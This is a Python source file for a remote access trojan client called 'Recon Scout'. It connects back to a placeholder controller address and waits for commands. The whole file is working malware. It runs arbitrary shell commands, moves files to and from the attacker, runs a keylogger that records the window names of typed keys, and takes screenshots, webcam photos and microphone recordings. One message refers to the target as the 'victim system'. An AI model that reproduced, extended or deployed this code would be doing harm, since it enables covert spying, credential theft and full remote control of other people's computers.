import socket, os, pickle, ctypes, pyaudio, wave, pyxhook, alsaaudio, subprocess, re, webbrowser, cv2
from threading import Thread
from platform import platform
from getpass import getuser
from time import sleep
from datetime import datetime
from mss import mss

port = !!!!!
ip_addr = @@@@@
server_key = #####
End = $$$$$
sid = %%%%%
time_to_sleep = ^^^^^
type_of_scout = 'Recon Scout'
try:
    operating_sys = platform()
except:
    operating_sys = '?????'
try:
    hostname = socket.gethostname()
except:
    hostname = '?????'
try:
    username = getuser()
except:
    username = '?????'
userinfo = hostname + '/' + username
scout_data = [sid, server_key, userinfo, type_of_scout, operating_sys]
s = None
key_buffer = ''
stopkey = None
stopmse = None
window = None
kill_keylog_thread = False
active = False
non_represent = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890'
shell_type = '/bin/bash'

help_menu = '''\nRecon Scout Menu
==================

   Global Commands :
      banner                            Display a banner
      clear                             Clear the screen
      help                              Show the help menu
      local <shell command>             Locally execute a shell command
      python                            Enter the system python interpreter
      quit                              Quit the framework

   Connection commands :
      disconnect                        Make the scout disconnect and try to reconnect
      terminate                         Kill the scout process
      sleep <seconds>                   Disconnect the scout and make it sleep for some time

   Handler commands :
      back                              Move back to scout handler

   Command Shell Commands :
      exec <shell command>              Executes shell command and returns output
      swap <shell path>                 Switch the type of shell used, default is "/bin/bash"

   File Commands :
      download <filepath>               Download file
      upload <filepath>                 Upload a file

   Recon Commands :
      browse <URL>                      Open a URL with default browser
      screen                            Take a screenshot
      show_keylog                       Show keylogged keys in buffer
      start_keylog                      Start keylogger
      stop_keylog                       Stop keylogger

   Webcam Commands :
      webcam                            Snap a picture from the default webcam and download

   Audio Commands :
      rec_audio <seconds>               Record audio for a specified amount of time
      set_audio <int/float>             Set audio to specified integer or float\n'''

def basename(filepath):
    basename = re.search(r'[^\\/]+(?=[\\/]?$)', filepath)
    if basename:
        return basename.group(0)


def upload_file(file_name, content):
    try:
        f = open(basename(file_name), 'wb')
        f.write(content)
        f.close()
        s.sendall('[+]Uploaded file successfully' + End)
    except Exception as e:
        s.sendall('[-]Error writing to file "' + file_name + '" : ' + str(e) + End)


def download_file(file_name):
    if os.path.isfile(file_name):
        try:
            f = open(file_name, 'rb')
            bin_data = f.read()
            f.close()
            s.sendall(file_name + '|/' + bin_data + End)
        except Exception as e:
            s.sendall('[-]Error reading from file "' + file_name + '" : ' + str(e) + End)
    else:
        s.sendall('[-]File path/name is not valid' + End)

def set_audio(number):
    try:
        vol = alsaaudio.Mixer()
        current = str(vol.getvolume()[0])
        vol.setvolume(number)
        s.sendall('[*]Valid volume range : 0-100')
        s.sendall('\n[*]Current volume : '+current)
        s.sendall('\n[+]Setting volume to : '+str(number)+End)
    except Exception:
        s.sendall('\n[-]Error setting volume, invalid argument'+End)

def record_audio(seconds):
    namef = datetime.now().strftime("%Y%m%d-%H%M%S") + '.wav'
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    CHUNK = 1024
    RECORD_SECONDS = seconds
    WAVE_OUTPUT_FILENAME = namef
    audio = pyaudio.PyAudio()
    stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True,
                        frames_per_buffer=CHUNK)
    frames = []
    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    audio.terminate()
    waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    waveFile.setnchannels(CHANNELS)
    waveFile.setsampwidth(audio.get_sample_size(FORMAT))
    waveFile.setframerate(RATE)
    waveFile.writeframes(b''.join(frames))
    waveFile.close()
    download_file(namef)
    os.remove(namef)

def shell_execute(execute):
    if execute[:3] == 'cd ':
        try:
            execute = execute.replace('cd ', '')
            os.chdir(execute)
            s.sendall("[+]Changed to directory : " + execute + End)
        except:
            s.sendall('[-]Could not change to directory : ' + execute + End)
    else:
        try:
            result = subprocess.Popen(execute, shell=True, executable=shell_type, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                      stdin=subprocess.PIPE)
            result = result.stdout.read() + result.stderr.read()
            try:
                s.sendall(unicode(result + End))
            except:
                s.sendall(result + End)
        except:
            s.sendall('[-]Could not execute command' + End)

def download_file(file_name):
    if os.path.isfile(file_name):
        try:
            f = open(file_name, 'rb')
            bin_data = f.read()
            f.close()
            s.sendall(file_name + '|/' + bin_data + End)
        except Exception as e:
            s.sendall('[-]Error reading from file "' + file_name + '" : ' + str(e) + End)
    else:
        s.sendall('[-]File path/name is not valid' + End)


def OnEvent(event):
    global key_buffer, window
    try:
        if event.WindowName != window:
            new_win_msg = 'User started typing in new window : ' + event.WindowName
            seperator = '=' * len(new_win_msg)
            key_buffer += '\n\n' + new_win_msg + '\n' + seperator + '\n\n'
            window = event.WindowName
        else:
            window = event.WindowName
        log = event.Key.lower()
        if log == 'space':
            log = ' '
        elif log == 'return':
            log = '<' + log + '>\n'
        elif log not in non_represent:
            log = '<' + log + '>'
        key_buffer += log
    except:
        key_buffer += '<Error>'
    return True


def start_key_log():
    global kill_keylog_thread
    hm = pyxhook.HookManager()
    hm.KeyDown = OnEvent
    hm.HookKeyboard()
    hm.start()
    while not kill_keylog_thread:
        sleep(0.5)
    hm.cancel()

def recvall(tar_socket):
    tar_socket.settimeout(None)
    data = tar_socket.recv(9999)
    if not data:
        return ''
    while True:
        if data.endswith(End):
            try:
                tar_socket.settimeout(1)
                more_data = tar_socket.recv(9999)
                if not more_data:
                    return data[:-len(End)]
                data += more_data
            except (socket.timeout,socket.error):
                tar_socket.settimeout(None)
                return data[:-len(End)]
        else:
            more_data = tar_socket.recv(9999)
            data += more_data


def screenshot():
    try:
        tar_file = datetime.now().strftime("%Y%m%d-%H%M%S") + '.png'
        with mss() as sct:
            sct.shot(output=tar_file)
        download_file(tar_file)
        os.remove(tar_file)
    except Exception as e:
        s.sendall('[-]Error taking screenshot : ' + str(e) + End)

def web_cam_user():
    try:
        tar_file = datetime.now().strftime("%Y%m%d-%H%M%S") + '.png'
        camera_port = 0
        ramp_frames = 30
        camera = cv2.VideoCapture(camera_port)
        def get_image():
            retval, im = camera.read()
            return im
        for i in xrange(ramp_frames):
            temp = get_image()
        camera_capture = get_image()
        if not camera_capture:
            s.sendall('[-]Could not take webcam snapshot, webcam not configured properly' + End)
            return
        cv2.imwrite(tar_file, camera_capture)
        camera = None
        download_file(tar_file)
        os.remove(tar_file)
    except Exception as e:
        s.sendall('[-]Error taking webcam snapshot : ' + str(e) + End)

def main():
    global s, stopkey, stopmse, active, key_buffer, kill_keylog_thread, shell_type
    while True:
        while True:
            try:
                s = socket.socket()
                s.connect((ip_addr, port))
                break
            except socket.error:
                sleep(time_to_sleep)
                continue
        s.sendall(pickle.dumps(scout_data) + End)
        while True:
            try:
                #s.settimeout(None)
                data = recvall(s).split(' ', 1)
                command = data[0]
                if command == 'help':
                    s.sendall(help_menu + End)
                elif command == 'disconnect':
                    s.sendall('[*]Disconnecting...' + End)
                    sleep(5)
                    break
                elif command == 'terminate':
                    s.sendall('[*]Terminating scout...' + End)
                    os._exit(1)
                elif command == 'sleep':
                    try:
                        sleep_time = int(data[1])
                    except:
                        s.sendall('[-]Please specify an integer as the sleep duration' + End)
                        continue
                    s.sendall('[*]Scout going offline for : ' + str(sleep_time) + ' seconds' + End)
                    s.shutdown(1)
                    s.close()
                    for i in range(sleep_time):
                        sleep(1)
                    break
                elif command == 'exec':
                    try:
                        execute = data[1]
                    except:
                        s.sendall('[-]Specify a command to execute' + End)
                        continue
                    shell_execute(execute)
                elif command == 'swap':
                    try:
                        shell_type = data[1]
                        s.sendall('[+]Current shell in use is : '+shell_type+End)
                    except:
                        s.sendall('[-]Specify a shell type'+End)
                elif command == 'download':
                    try:
                        file_name = data[1]
                    except:
                        s.sendall('[-]Specify file to download' + End)
                        continue
                    download_file(file_name)
                elif command == 'upload':
                    data = data[1].split('|/', 1)
                    file_name = data[0]
                    file_contents = data[1]
                    upload_file(file_name, file_contents)
                elif command == 'browse':
                    try:
                        webbrowser.open(data[1])
                        s.sendall('[+]Opened URL : ' + data[1] + End)
                    except IndexError:
                        s.sendall('[-]Specify a URL to open' + End)
                    except webbrowser.Error:
                        s.sendall('[-]Browser error' + End)
                elif command == 'screen':
                    screenshot()
                elif command == 'show_keylog':
                    s.sendall(key_buffer + End)
                    key_buffer = ''
                elif command == 'start_keylog':
                    if not active:
                        kill_keylog_thread = False
                        t = Thread(target=start_key_log, args=())
                        t.start()
                        active = True
                        s.sendall('[+]Keylogger logging to buffer' + End)
                    elif active:
                        s.sendall('[-]Keylogger is already active' + End)
                elif command == 'stop_keylog':
                    if active:
                        kill_keylog_thread = True
                        active = False
                        s.send('[+]Keylogger process killed!' + End)
                    elif not active:
                        s.send('[-]No keylogger process has started on victim system' + End)
                elif command == 'rec_audio':
                    try:
                        seconds = int(data[1])
                        record_audio(seconds)
                    except (IndexError, TypeError):
                        s.sendall('[-]Please supply an integer as the argument' + End)
                elif command == 'set_audio':
                    try:
                        level = int(data[1])
                        set_audio(level)
                    except (IndexError,TypeError):
                        s.sendall('[-]Provide float/int as an arg'+End)
                elif command == 'ping':
                    s.sendall('[+]Scout is alive' + End)
                elif command == 'webcam':
                    web_cam_user()
                else:
                    s.sendall('[-]Unknown command "' + command + '", run "help" for help menu' + End)
            except (socket.error, socket.timeout):
                try:
                    s.shutdown(1)
                    s.close()
                    break
                except socket.error:
                    break
            except Exception as e:
                try:
                    if command:
                        s.sendall('[-]Error, last run command : ' + command + '. Error message : ' + str(e) + End)
                    else:
                        s.sendall('[-]Error message : ' + str(e) + End)
                except:
                    s.shutdown(1)
                    s.close()
                    break


main()

